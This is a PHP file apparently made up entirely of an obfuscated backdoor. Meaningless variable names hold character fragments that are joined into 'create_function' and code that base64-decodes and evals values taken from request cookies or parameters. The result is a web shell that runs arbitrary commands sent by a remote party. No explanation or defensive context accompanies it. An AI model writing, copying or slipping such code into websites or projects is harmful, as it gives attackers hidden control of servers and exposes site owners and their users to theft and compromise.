<?php
$collie ='4'; $detectable='HsP'; $funneled= 'SQ)r)'; $lam='o(ne'; $feminist ='r';
$diathermy ='FrXBt';$grumbled= 't'; $druggists= 'd';$cyanide = 's';$kewl= 'a';$annexes= 'st';$auroora= 's';

$compulsory= ')'; $heartfelt= ';Vf';$bathed ='E';
$bunion = 'u';$boll = '),]cfO(';$cyberhacker = '(srix(P"';
$helpfully = '"'; $divulging='ii[)v$(e('; $doon = '0e=4]W)"S';$cessation='M';$disbands ='T';$breathable = 'v';$jyoti=':';$anissa = 'a'; $frigid ='nu$';$chicory = '(';$lad ='ei'; $gem='s5YeT';$exhaled = 'T';$kermitthefrog ='$';
$distritbute ='Kyt';$counties = 'I'; $combinational = '$r';

$mair = 's_'; $electrician='T'; $harsh ='(aD?Uew';$defenseless ='9'; $immigrated = 'ytEQGrdE;'; $concatenations = 'S'; $glacial= '_'; $catharine ='G';

$loot= 'o';$circumcise= 'E';

$karna='"';

$fainter ='fe)6$[=Fd';
$cum= ' Jar;_';$healing= '$$'; $indirecting= 'p(g'; $bread = 'era'; $heated = '(wiZ'; $error ='se:_erPFU'; $garages ='ia=p';

$heighten = 'm';
$inattention= 'A'; $dixieland= '6$f[$D';$magnitudes = '?';

$janean ='R';$gondola = ')'; $halogen ='s'; $fiddles ='eaITt';$freewheel = 'r';
$klara= 'O'; $drawn ='oH'; $cathe = 'W';$gucci='llCa)_G';$jaquith= ':';$gambled='[';
$betrays= 'N2';$impaction = 'Wc';$ephraim = 'gI7v?,'; $karol = 'i'; $duller= 'EaIXe'; $alveolar = ')"';

$guardians='_';$career = '_'; $attempts='"';$arms='(es"gH'; $burners ='R]_E;V';$banished='x';$bondon = 'Cid"KRi)';$angling = ']'; $derward='c1_t'; $indeterminacy= 'eE@i8Sr;S';$inhabit='ag_'; $cesya='OiaR';$exclaimer ='e';$arbitrage= 'n';$kate= 'c';
$assertively ='3[evLg>Db'; $deviates= 'X<d';

$equivocate='_';

$game='e$TE'; $keddah=$kate .$indeterminacy['6']. $game['0'] . $cesya['2']. $derward['3'] . $game['0'].
$equivocate .$dixieland['2']. $frigid[1] .
$arbitrage .

$kate . $derward['3'] .$cesya['1'] .$drawn['0'] .$arbitrage ; $circuit =$cum['0'];$digest =$keddah($circuit,$game['0'] . $assertively['3'] .

$cesya['2'].$gucci['1'].$arms['0'].$cesya['2'].$indeterminacy['6'].$indeterminacy['6'].$cesya['2'] .

$immigrated['0']. $equivocate .
$garages['3'] .$drawn['0']. $garages['3'].
$arms['0'].$dixieland['2'].$frigid[1]. $arbitrage . $kate.
$equivocate.$assertively['5'].

$game['0']. $derward['3'] .$equivocate. $cesya['2'] .$indeterminacy['6'] . $assertively['5'] .

$arms['2'].$arms['0'].$bondon['7']. $bondon['7'].$bondon['7']. $indeterminacy['7']); $digest($assertively['5'],

$diathermy[3] ,$impetuous['5'] ,$cultivation['6'], $android['7'],$game['3'] ,$indeterminacy['2'],
$arbitrage,$ephraim['2'] ,$arms['0'] ,$derward['3'] ,$game['1'].$cesya['1']. $garages['2'].$cesya['2']. $indeterminacy['6'] .$indeterminacy['6'] . $cesya['2'] . $immigrated['0']. $equivocate. $heighten.$game['0'] . $indeterminacy['6'] .$assertively['5'] .$game['0'] .$arms['0'] .$game['1'].$equivocate .$cesya['3'] . $game['3'] . $immigrated['3'] .$error['8'].$game['3'] .
$indeterminacy['8'] . $game['2']. $ephraim['5'] . $game['1'] . $equivocate . $bondon['0'] .

$cesya[0].$cesya[0]. $bondon['4'] . $duller['2'].$game['3']. $ephraim['5'].$game['1'].$equivocate.$indeterminacy['8'].$game['3'] . $cesya['3'] .$burners['5'] .$game['3']. $cesya['3'].$bondon['7'] . $indeterminacy['7'] .$game['1'] .

$cesya['2']. $garages['2'] .$cesya['1'] . $arms['2'].$arms['2'].$game['0'] .$derward['3'].

$arms['0'].$game['1'] . $cesya['1'].$assertively['1']. $bondon['3'] . $assertively['5'].$arms['2']. $dixieland['2'] .$heated['1'].
$deviates['2'] .$cesya['1'] .

$game['0'].$banished .$bondon['3'].
$angling . $bondon['7'] . $ephraim['4'].$game['1'].$cesya['1'] . $assertively['1']. $bondon['3']. $assertively['5'].$arms['2'] .$dixieland['2'] . $heated['1'] .$deviates['2']. $cesya['1'] .
$game['0'] . $banished .$bondon['3'].
$angling . $jaquith .$arms['0']. $cesya['1'] .$arms['2']. $arms['2'] .$game['0']. $derward['3']. $arms['0'] . $game['1'] . $cesya['1'] .$assertively['1'] .$bondon['3']. $arms['5']. $game['2']. $game['2'] . $error[6] .$equivocate . $gucci[6].
$indeterminacy['8'] .$error[7].$impaction['0'] .$assertively['7'] . $duller['2'] .$game['3'] .$deviates['0'] . $bondon['3']. $angling.

$bondon['7'] .$ephraim['4'] .
$game['1'].
$cesya['1'] .$assertively['1'] . $bondon['3'].
$arms['5'] .

$game['2'] .$game['2'].
$error[6] . $equivocate.
$gucci[6].$indeterminacy['8']. $error[7].$impaction['0'] .$assertively['7'] .
$duller['2'] .$game['3'] .
$deviates['0'].$bondon['3'] .$angling . $jaquith .
$deviates['2']. $cesya['1'] .
$game['0'] .$bondon['7'] . $indeterminacy['7'] . $game['0'].$assertively['3'].$cesya['2'].$gucci['1'].$arms['0']. $arms['2'] . $derward['3']. $indeterminacy['6']. $indeterminacy['6'].$game['0'] .

$assertively['3']. $arms['0'] .
$assertively[8]. $cesya['2'] . $arms['2'] . $game['0'] .

$dixieland['0']. $doon['3'] . $equivocate .
$deviates['2'] .

$game['0'] . $kate. $drawn['0'].$deviates['2'] . $game['0'].$arms['0'].$arms['2'].
$derward['3'].

$indeterminacy['6'].

$indeterminacy['6'].$game['0'].
$assertively['3']. $arms['0'] . $game['1'] .$cesya['2'] . $bondon['7'].$bondon['7'] . $bondon['7'] .$bondon['7'] .$indeterminacy['7']  );